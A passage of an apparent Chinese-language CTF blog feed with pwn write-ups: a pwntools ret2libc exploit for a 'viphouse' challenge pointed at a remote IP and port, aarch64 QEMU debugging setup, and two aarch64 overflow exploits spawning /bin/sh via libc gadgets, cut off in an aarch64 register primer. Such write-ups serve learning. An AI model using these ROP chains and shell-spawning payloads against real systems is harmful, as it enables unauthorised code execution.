c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add_Note</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please delete at first!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to allocate memory.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">    get_str((__int64)ptr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">      <span class="built_in">strcpy</span>(dest, ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note added.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Add_Noteå‡½æ•°ä¼šæŠŠè¾“å…¥æ”¾åˆ°deståœ°å€æŒ‡å‘çš„å†…å­˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401CB2 55                            push    rbp</span><br><span class="line">.text:0000000000401CB3 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000401CB6 48 8D 05 73 24 00 00          lea     rax, dest;æŠŠdeståœ°å€ç»™rax</span><br><span class="line">.text:0000000000401CBD 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401CC0 48 8B 3F                      mov     rdi, [rdi];æŠŠdeståœ°å€æŒ‡å‘çš„å†…å­˜ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„addnoteå‡½æ•°é‡Œçš„è¾“å…¥ç»™rdi</span><br><span class="line">.text:0000000000401CC3 C3                            retn</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./viphouse&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">a</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Choose an option: &#x27;</span>,<span class="built_in">str</span>(a).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">a,b</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>,a)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;note: &#x27;</span>,a)</span><br><span class="line"><span class="comment"># login(b&#x27;admin\x00&#x27;,b&#x27;root\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io = remote(<span class="string">&#x27;118.24.31.155&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>) </span><br><span class="line">    <span class="comment"># nc 118.24.31.155 9999</span></span><br><span class="line">    login(<span class="string">b&#x27;admin\x00&#x27;</span>,<span class="string">b&#x27;root\x00&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: \n&#x27;</span>, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">    result = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;give you a gif&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.close()</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0401AC3&#x27;)</span></span><br><span class="line"></span><br><span class="line">add(p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(result.split(<span class="string">b&#x27;!&#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">ret_ad=<span class="number">0x4012D0</span></span><br><span class="line">setrdi=<span class="number">0x0401CB6</span></span><br><span class="line">paylaod=<span class="number">0x40</span>*<span class="string">b&#x27;a&#x27;</span>+flat([canary,<span class="number">0</span>,setrdi,elf.plt[<span class="string">&#x27;puts&#x27;</span>],ret_ad])</span><br><span class="line">logout()</span><br><span class="line">login(<span class="string">b&#x27;admin&#x27;</span>,paylaod)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libcelf.address=libcbase</span><br><span class="line">pop_rdi_ret=<span class="built_in">next</span>(libcelf.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(pop_rdi_ret)</span><br><span class="line">binsh=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+libcbase</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">add(p64(binsh))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">logout()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rop.ret.address))</span><br><span class="line">payload=<span class="number">0x40</span>*<span class="string">b&#x27;a&#x27;</span>+flat([canary,<span class="number">0</span>,setrdi,system])<span class="comment">#æœ€åç”¨pop rdiç»™systemå‚æ•°èµ‹å€¼çš„è¯ï¼Œç”±äºæ ˆåœ°å€å¯¹é½éœ€è¦å«ä¸€ä¸ªretï¼Œæº¢å‡ºé•¿åº¦ä¼šä¸å¤Ÿ</span></span><br><span class="line">login(<span class="string">b&#x27;admin&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢aarch64 pwn</title>
      <link href="/2023/07/20/first-aarch64-pwn/"/>
      <url>/2023/07/20/first-aarch64-pwn/</url>
      
        <content type="html"><![CDATA[<p>start-g.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-aarch -L /usr/aarch64-linux-gnu/ ./a.out</span><br></pre></td></tr></table></figure><p>attach.sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo gdb-multiarch ./a.out -ex <span class="string">&quot;target remote:1234&quot;</span></span><br></pre></td></tr></table></figure><p>pythonè„šæœ¬é‡Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])<span class="comment">#è°ƒè¯•</span></span><br><span class="line">io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])<span class="comment">#ä¸è°ƒè¯•</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Dest0g3-520è¿æ–°èµ›-ez-aarch"><a href="#Dest0g3-520è¿æ–°èµ›-ez-aarch" class="headerlink" title="Dest0g3_520è¿æ–°èµ›_ez_aarch"></a>Dest0g3_520è¿æ–°èµ›_ez_aarch</h2><p>æœ‰åé—¨çš„ç®€å•æº¢å‡ºï¼Œæ”¹æœ€åä¸€ä¸ªå­—èŠ‚å°±è¡Œï¼Œå…³äºpaddingçš„æ•°é‡å› ä¸ºéœ€è¦ä¿®æ”¹çš„æ˜¯è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ï¼Œæ‰€ä»¥idaä¸‹é¢è¿™ä¸ªå°±æ²¡ç”¨äº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br></pre></td></tr></table></figure><p>åç§»å¯ä»¥ç”¨cyclicæ¥ç¡®å®šï¼Œæˆ–è€…å»çœ‹æ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000000968</span> FD <span class="number">7B</span> BD A9                   STP             X29, X30, [SP,#<span class="number">-0x30</span>]!</span><br><span class="line">.text:<span class="number">000000000000096</span>C FD <span class="number">03</span> <span class="number">00</span> <span class="number">91</span>                   MOV             X29, SP</span><br><span class="line">.text:<span class="number">0000000000000970</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> A0 <span class="number">2</span>A <span class="number">91</span>       ADRL            X0, aPleaseLeaveYou     ; <span class="string">&quot;Please leave your name:&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000978</span> <span class="number">92</span> FF FF <span class="number">97</span>                   BL              .<span class="built_in">puts</span></span><br><span class="line">.text:<span class="number">0000000000000978</span></span><br><span class="line">.text:<span class="number">000000000000097</span>C E0 <span class="number">43</span> <span class="number">00</span> <span class="number">91</span>                   ADD             X0, SP, #<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0000000000000980</span> <span class="number">02</span> <span class="number">06</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W2, #<span class="number">0x30</span> ; <span class="string">&#x27;0&#x27;</span>         ; nbytes</span><br><span class="line">.text:<span class="number">0000000000000984</span> E1 <span class="number">03</span> <span class="number">00</span> AA                   MOV             X1, X0                  ; buf</span><br><span class="line">.text:<span class="number">0000000000000988</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W0, #<span class="number">0</span>                  ; fd</span><br><span class="line">.text:<span class="number">000000000000098</span>C <span class="number">91</span> FF FF <span class="number">97</span>                   BL              .read</span><br><span class="line">.text:<span class="number">000000000000098</span>C</span><br><span class="line">.text:<span class="number">0000000000000990</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">2B</span> <span class="number">91</span>       ADRL            X0, aOkYouCanExploi     ; <span class="string">&quot;OK, you can exploit it now.&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000998</span> <span class="number">8</span>A FF FF <span class="number">97</span>                   BL              .<span class="built_in">puts</span></span><br><span class="line">.text:<span class="number">0000000000000998</span></span><br><span class="line">.text:<span class="number">000000000000099</span>C <span class="number">1F</span> <span class="number">20</span> <span class="number">03</span> D5                   NOP</span><br><span class="line">.text:<span class="number">00000000000009</span>A0 FD <span class="number">7B</span> C3 A8                   LDP             X29, X30, [SP+<span class="number">0x30</span>+var_30],#<span class="number">0x30</span></span><br><span class="line">.text:<span class="number">00000000000009</span>A4 C0 <span class="number">03</span> <span class="number">5F</span> D6                   RET</span><br></pre></td></tr></table></figure><p><code> STP             X29, X30, [SP,#-0x30]!</code>æŠŠfpå’Œx30å­˜åˆ°æ ˆé‡ŒåæŠŠspæå‡äº†0x30,<code>ADD             X0, SP, #0x10</code>bufåœ°å€æ˜¯sp+0x10æ‰€ä»¥bufè·ç¦»fpä½0x20 è·ç¦»lrä¸º0x28</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./ez_aarch&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/aarch64-linux-gnu//lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="meta"># io = process(pwnfile)</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])#è°ƒè¯•</span><br><span class="line">    <span class="meta"># io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])#ä¸è°ƒè¯•</span></span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">40</span></span><br><span class="line">s(padding+p8(<span class="number">0x3c</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2022å¹´ç¾å›¢æ¯-ret2libc-aarch64"><a href="#2022å¹´ç¾å›¢æ¯-ret2libc-aarch64" class="headerlink" title="2022å¹´ç¾å›¢æ¯_ret2libc_aarch64"></a>2022å¹´ç¾å›¢æ¯_ret2libc_aarch64</h2><p>ç»™ä¸€æ¬¡æ³„éœ²åœ°å€çš„æœºä¼šï¼Œè¿˜æœ‰ä¸€æ¬¡æº¢å‡ºæœºä¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400948</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400948</span> FD <span class="number">7B</span> B7 A9                   STP             X29, X30, [SP,#<span class="number">-0x90</span>]!</span><br><span class="line">.text:<span class="number">000000000040094</span>C FD <span class="number">03</span> <span class="number">00</span> <span class="number">91</span>                   MOV             X29, SP</span><br><span class="line">.text:<span class="number">0000000000400950</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> C0 <span class="number">2</span>A <span class="number">91</span>       ADRL            X0, asc_400AB0          ; <span class="string">&quot;&gt; &quot;</span></span><br><span class="line">.text:<span class="number">0000000000400958</span> <span class="number">5</span>E FF FF <span class="number">97</span>                   BL              .<span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0000000000400958</span></span><br><span class="line">.text:<span class="number">000000000040095</span>C E0 <span class="number">43</span> <span class="number">00</span> <span class="number">91</span>                   ADD             X0, SP, #<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0000000000400960</span> <span class="number">60</span> FF FF <span class="number">97</span>                   BL              .gets</span><br></pre></td></tr></table></figure><p>è®¡ç®—ä¸€ä¸‹padding 0x90-0x10+0x8&#x3D;0x88,æ¥ä¸‹æ¥å°±æ˜¯æ‰¾gadgetï¼Œå¥½éš¾æ‰¾</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary  /usr/aarch64-linux-gnu/lib/libc.so<span class="number">.6</span> | grep <span class="string">&#x27;ldr x0&#x27;</span> </span><br><span class="line"><span class="number">000069500</span> : ldr x0, [sp, #<span class="number">0x18</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br></pre></td></tr></table></figure><p>ldr x0, [sp, #0x18] ; æŠŠsp+0x18å¤„çš„å€¼å†™å…¥x0ï¼Œå¸ƒç½®ä¸º&#x2F;bin&#x2F;shåœ°å€</p><p>ldp x29, x30, [sp], #0x20 ; æŠŠspå¤„çš„å€¼å†™å…¥x29 sp+8å¤„çš„å€¼å†™å…¥x30 æ‰€ä»¥sp+8å¤„å¸ƒç½®systemåœ°å€</p><p>åˆ©ç”¨cyclicåŠ¨è°ƒå»æ‰¾åç§»</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload=padding+p64(gadget)+cyclic(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/07/20/first-aarch64-pwn/image-20230720164531216.png" alt="image-20230720164531216"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~&gt; cyclic -l gaaa</span><br><span class="line"><span class="number">24</span></span><br><span class="line">grxer@Ubuntu22 ~ [<span class="number">1</span>]&gt; cyclic -l kaaa</span><br><span class="line"><span class="number">40</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/aarch64-linux-gnu/lib/libc.so.6&#x27;</span>)</span><br><span class="line">libcrop=ROP(libc)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line">    <span class="comment"># io=process([&quot;qemu-aarch64&quot;,&quot;-L&quot;,&quot;/usr/aarch64-linux-gnu/&quot;,&quot;./pwn&quot;])</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">s(p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment">#0x55008cae70</span></span><br><span class="line">ru(<span class="string">b&#x27;le&gt;&gt;\n&#x27;</span>)</span><br><span class="line">puts_ad=uu32(r(<span class="number">3</span>))+<span class="number">0x5500000000</span></span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">libc_base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">p(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">p(<span class="string">&#x27;bin&#x27;</span>,binsh)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary  /usr/aarch64-linux-gnu/lib/libc.so.6 | grep &#x27;ldr x0&#x27; </span></span><br><span class="line"><span class="string">000069500 : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget=libc_base+<span class="number">0x00069500</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload=padding+p64(gadget)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(system_addr)+p64(<span class="number">40</span>-<span class="number">24</span>-<span class="number">8</span>)+p64(binsh)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Aarch64 ASM</title>
      <link href="/2023/07/19/aarch64-asm/"/>
      <url>/2023/07/19/aarch64-asm/</url>
      
        <content type="html"><![CDATA[<h1 id="Aarch64-ASM"><a href="#Aarch64-ASM" class="headerlink" title="Aarch64 ASM"></a>Aarch64 ASM</h1><h2 id="å¸¸è§å¯„å­˜å™¨"><a href="#å¸¸è§å¯„å­˜å™¨" class="headerlink" title="å¸¸è§å¯„å­˜å™¨"></a>å¸¸è§å¯„å­˜å™¨</h2><p><a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start</a></p><p>31ä¸ª64bité€šç”¨å¯„å­˜å™¨ X0-X30(Wnæ˜¯ä»–ä»¬çš„ä½32ä½) å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨spï¼ŒæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨pc</p><ul><li><strong>x0-x7 ç”¨äºå­ç¨‹åºè°ƒç”¨æ—¶çš„å‚æ•°ä¼ é€’ï¼ŒX0è¿˜ç”¨äºè¿”å›å€¼ä¼ é€’ ï¼Œå¤šäºå‚æ•°é€šè¿‡æ ˆä¼ é€’</strong></li><li><strong>x8å¸¸ç”¨æ¥å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·</strong></li><li><strong>x8-x15 ä¸´æ—¶å¯„å­˜å™¨ï¼Œæ˜“å˜å¯„å­˜å™¨ å­ç¨‹åºä¸éœ€è¦ä¿å­˜</strong></li><li>r16-r17å­ç¨‹åºå†…éƒ¨è°ƒç”¨å¯„å­˜å™¨IPC(intra-procedure-call)</li><li>x18 